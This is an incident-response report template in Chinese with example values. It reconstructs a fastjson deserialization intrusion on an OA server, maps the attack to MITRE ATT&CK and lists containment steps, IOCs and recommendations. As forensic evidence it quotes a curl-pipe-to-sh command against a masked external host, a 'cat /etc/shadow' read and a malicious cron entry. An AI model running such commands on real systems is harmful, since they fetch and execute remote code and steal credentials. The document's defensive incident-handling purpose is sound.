# 入侵事件报告 · {{case_id}}

> **案件编号**：`{{case_id}}` | **客户**：`<customer>` | **报告版本**：v{{report_version}} | **报告日期**：{{report_date}} | **机密等级**：仅限项目组 + 客户授权人

> 起草：`<analyst>` | 复核：`<reviewer>` | 客户对接人：`<customer_pm>`

---

## 1. 事件摘要（高管视角，≤200 字）

`{{executive_summary}}`

> 示例：「2026-06-30 08:31，客户 `<customer>` 对外 OA 系统（位于 `192.168.1.xxx`，端口 8080）通过 fastjson 反序列化漏洞被攻击者获得 web 容器权限，建立持久化后门并尝试横向探测同段主机。蓝队在告警后 1 小时 12 分介入，完成封堵、清除、取证。未发现批量数据外发，业务影响：OA 服务中断 23 分钟。dwell time 约 18.7 小时。」

---

## 2. 事件判定（verdict）

| 项 | 值 |
|---|---|
| **判定** | confirmed_intrusion / high_suspicion / inconclusive |
| **置信度** | {{confidence}} |
| **首次入侵时间** | {{first_evidence_ts}} |
| **末次活动时间** | {{last_evidence_ts}} |
| **dwell time（小时）** | {{dwell_time_hours}} |
| **影响主机数** | {{compromised_count}} |
| **数据外发** | 未发现 / `<n>` MB / 未知 |
| **持久化清除状态** | 已清除 / 部分清除 / 未清除 |

---

## 3. 受影响范围

### 3.1 已确认失陷主机
| 主机（脱敏） | 角色 | 失陷时段 | 影响等级 |
|---|---|---|---|
| `192.168.1.xxx` | OA 主节点 | 06-30 08:31 ~ 07-01 03:12 | 关键 |

### 3.2 疑似横向目标（待客户核实）
| 主机（脱敏） | 检出方式 | 状态 |
|---|---|---|
| `192.168.1.yyy` | OA 主机外联尝试 22/tcp 端口 | 已封堵，待客户主机自查 |

### 3.3 涉及账户
| 账户（脱敏） | 失陷类型 | 处置 |
|---|---|---|
| `root` (OA 主机) | 通过 web 进程链获得 | 已强制改密 + 轮换 key |
| `z*******` (运维) | ssh authorized_keys 添加未知公钥 | 已清理 |

### 3.4 数据评估
- 数据库：未发现批量导出动作（DBA 慢查询日志无异常）
- 文件：`/data/<app>/` 未发现 tar 打包痕迹
- 凭据：以下账户密码须强制重置 → 详见第 7 节

---

## 4. 攻击链还原（MITRE ATT&CK 战术映射）

> 每节点：**T-XXXX 技术 / 证据来源 / 时间戳 / 简述**

### 4.1 Reconnaissance（TA0001 / T1592）
- **证据**：`nginx-access.log:14201 ~ 14380`，08:23-08:30 同 src_ip 对 `/actuator/*` `/swagger/*` 探测
- **判定**：扫描 → 高度可疑

### 4.2 Initial Access（TA0001 / T1190 Exploit Public-Facing App）
- **证据**：`nginx-access.log:14523` 08:31:47 POST `/api/login`，命中 PLB-CE-006（fastjson 反序列化特征）
- **响应**：HTTP 200，body 1832 字节
- **判定**：confirmed

### 4.3 Execution（TA0002 / T1059.004 Unix Shell）
- **证据**：`04-processes.txt` 显示 tomcat (PID 3142) 拉起 bash → curl http://`<external>`/x.sh | sh
- **bash_history（`11-bash-history.txt`）**：root 账户出现 `cd /tmp` `wget` `chmod +x`
- **判定**：confirmed

### 4.4 Persistence（TA0003）
- **证据 1**：`09-persistence.txt` 显示 `/etc/cron.d/.update`，内容为 `* * * * * root /tmp/.X11-lock`
- **证据 2**：`10-ssh.txt` 显示 root authorized_keys 新增 1 个未知公钥（指纹 `<masked>`）
- **判定**：confirmed，已识别 2 个持久化点

### 4.5 Privilege Escalation
- 未发现独立提权动作（fastjson 命中时 tomcat 已以 root 运行 ← 客户配置不当）

### 4.6 Defense Evasion（TA0005 / T1070.002 Clear Linux Logs）
- **证据**：`/var/log/auth.log` 08:35-09:12 存在断档（前后行号不连续）
- **判定**：high_suspicion

### 4.7 Credential Access（TA0006 / T1003.008 /etc/shadow）
- **证据**：`11-bash-history.txt` 有 `cat /etc/shadow` 命令记录
- **判定**：confirmed → 全员密码强制重置

### 4.8 Discovery（TA0007 / T1018 Remote System Discovery）
- **证据**：`/tmp/scan_ports.txt` 显示对 192.168.1.0/24 段的端口扫描结果
- **工具识别**：疑似 fscan（路径与默认输出格式吻合）
- **判定**：confirmed

### 4.9 Lateral Movement（TA0008）
- **证据**：`05-network.txt` 显示对 192.168.1.yyy:22 多次 TCP SYN，无成功 SYN-ACK
- **判定**：尝试未遂

### 4.10 Collection（TA0009）
- 未发现 tar / zip 打包动作

### 4.11 Command and Control（TA0011 / T1071.001 Web Protocols）
- **证据**：`05-network.txt` 显示与 `<external-ip>:443` 的 ESTABLISHED 长连接（持续 7 小时）
- **判定**：confirmed C2 通道

### 4.12 Exfiltration（TA0010）
- 未发现批量数据外发
- C2 通道流量统计：上行 ~3.2 MB，下行 ~12 MB（应为命令/工具下载）

### 4.13 Impact（TA0040）
- 未发现数据删改 / 加密 / 勒索

---

## 5. 入口根因分析

### 5.1 直接根因
- **OA 系统 fastjson 版本未升级** → 已知反序列化漏洞被利用

### 5.2 助力根因
- **tomcat 以 root 启动**（违反最小权限原则）
- **8080 端口直接对外网暴露**（应在 WAF / 反向代理后）
- **审计日志保留期不足**（dwell time 还原困难）
- **/etc/cron.d 写权限管控不严**

### 5.3 关键时间节点
| 时间 | 事件 |
|---|---|
| 06-30 08:23 | 攻击者首次侦察 |
| 06-30 08:31 | Initial Access 成功 |
| 06-30 08:35 | 持久化部署 |
| 06-30 09:11 | 横向探测开始 |
| 07-01 03:12 | 最末活动（C2 心跳） |
| 07-01 10:25 | 蓝队首次告警（基于 SIEM）|
| 07-01 10:40 | 封堵完成 |
| 07-01 14:00 | 取证完成 |

---

## 6. 应急处置动作（执行清单 + 状态）

### 6.1 止血（containment）
| # | 层 | 动作 | 状态 | 执行人 | 时间 |
|---|---|---|---|---|---|
| 1 | network | 出口防火墙封禁 `<external-ip>` | done | 客户网络组 | 10:32 |
| 2 | network | 8080 端口对外网封禁 | done | 客户网络组 | 10:40 |
| 3 | host | kill PID 3142 及子进程 | done | 客户主机组 | 10:48 |
| 4 | host | 关停 tomcat 服务 | done | 客户应用组 | 10:50 |
| 5 | account | 强制改 root 密码、轮换 ssh key | done | 客户主机组 | 11:02 |
| 6 | app | OA 系统临时下线（公告窗口）| done | 客户业务组 | 10:55 |

### 6.2 根除（eradication）
| # | 动作 | 状态 | 验证人 |
|---|---|---|---|
| 1 | 删除 `/tmp/.X11-lock` 后门文件 | done | 客户主机组 |
| 2 | 删除 `/etc/cron.d/.update` | done | 客户主机组 |
| 3 | 清理 root authorized_keys 中未知公钥 | done | 客户主机组 |
| 4 | 升级 fastjson 至 `<safe-version>` 或上 patch | in_progress | 客户应用组 |
| 5 | tomcat 改 systemd 服务，以非 root 运行 | planned | 客户应用组 |
| 6 | 验证 tomcat 子进程无异常 | done | 蓝队 |

### 6.3 恢复（recovery）
| # | 动作 | 状态 |
|---|---|---|
| 1 | 保留 OA 主机快照作为取证副本 | done |
| 2 | 从 6-29 凌晨 02:00 备份恢复（早于入侵时间） | done |
| 3 | 重新部署应用 + 校验完整性 | in_progress |
| 4 | 灰度恢复对外访问（先内网 1h，无异常后开外网） | planned |

---

## 7. 验证清单（确认根除成功）

蓝队 / 客户在恢复服务前必须逐项 PASS：

- [ ] **8080 端口对外**：仅经 WAF 后端访问 / 临时关闭
- [ ] **tomcat 进程**：以非 root 运行（uid != 0）
- [ ] **子进程**：tomcat 下游无 bash / curl / wget
- [ ] **持久化**：cron.d、systemd timer、authorized_keys 全部账户已审查
- [ ] **/tmp /var/tmp /dev/shm**：无异常可执行文件
- [ ] **外联**：30 天滚动监控 `<external-ip>` 与 known IOC，无命中
- [ ] **审计日志**：审计完整性已启用（auditd / journald 持久化）

---

## 8. IOC 清单（导入 SIEM 持续监控）

完整 IOC 列表见附件 `iocs-{{case_id}}.json`，遵循 SKILL.md IOC 7 字段 schema。本案核心 IOC：

| type | value（脱敏） | confidence | tag |
|---|---|---|---|
| ip | `<external-ip>` | high | c2:confirmed |
| domain | `<external-domain>` | high | c2:confirmed |
| path | `/tmp/.X11-lock` | high | persistence:backdoor |
| path | `/etc/cron.d/.update` | high | persistence:cron |
| hash:sha256 | `<sha256>` | medium | malware:dropper |
| ua | `Apache-HttpClient` | medium | tool:suspect |

---

## 9. 经验教训与改进建议

### 9.1 客户侧建议
1. **补丁机制**：建立紧急补丁通道，0day/Nday 公布后 72h 内打到生产
2. **最小权限**：所有应用服务以专属低权账户运行，禁止 root 直接拉起
3. **日志保留期**：核心日志（auth / nginx / audit）保留 ≥ 90 天，离线归档 ≥ 180 天
4. **出口策略**：业务主机出口走白名单（仅放行业务必需的外联）
5. **WAF 覆盖**：所有对外业务必须经 WAF，禁止直接暴露

### 9.2 蓝队 / 监管侧建议
- SIEM 规则补充：fastjson `"@type"` 字段触发 + 异常 outbound 长连接 + cron.d 文件变更
- 在 hvv-defender 内置 IOC 库添加本案的 `<external-ip>` `<external-domain>` `<sha256>`
- 增加 v0.2 计划：OA / 中间件类 fastjson / log4j / shiro 专项审计 playbook

---

## 10. 法律与合规

- 本案已按客户内部流程通报到客户法务 / 安全合规
- 客户已确认是否进入司法程序：`<yes/no>`，预计于 `<date>` 决定
- 数据保全：取证副本（含主机快照、采集包、时间线、本报告）保留 90 天后销毁，销毁记录见 `<custodian>`

---

## 11. 附件清单

| 附件 | 说明 |
|---|---|
| `hvv-collect-<host>-<ts>.tar.gz` | linux_quick_check.sh 原始采集包 |
| `timeline-merged.ndjson` | timeline_build.py 合并时间线 |
| `webshell-scan.json` | webshell_scan.py 扫描结果 |
| `iocs-{{case_id}}.json` | 完整 IOC 列表 |
| `kill-chain.json` | ir-investigator 子 agent 原始输出 |
| `evidence-images/` | 截图证据（如有） |

---

## 12. 签字 / 复核

| 角色 | 姓名 | 日期 | 签字 |
|---|---|---|---|
| 起草人（蓝队） | `<analyst>` | {{report_date}} | |
| 复核人（蓝队 lead） | `<reviewer>` | {{report_date}} | |
| 客户对接人 | `<customer_pm>` | {{report_date}} | |
| 客户合规复核 | `<customer_compliance>` | {{report_date}} | |

---

> 本报告所有 IP / 用户名 / 域名 / 客户名 / 内部路径已通过 `scripts/desensitize.py --mode strict` 强制脱敏。未脱敏版本仅在客户加密渠道（密码学保护）内流转。
>
> 本报告由 `hvv-defender` v{{skill_version}} 生成草稿，攻击链还原使用 `agents/ir-investigator` 子 agent，蓝队人工二次复核 + 修订定稿。
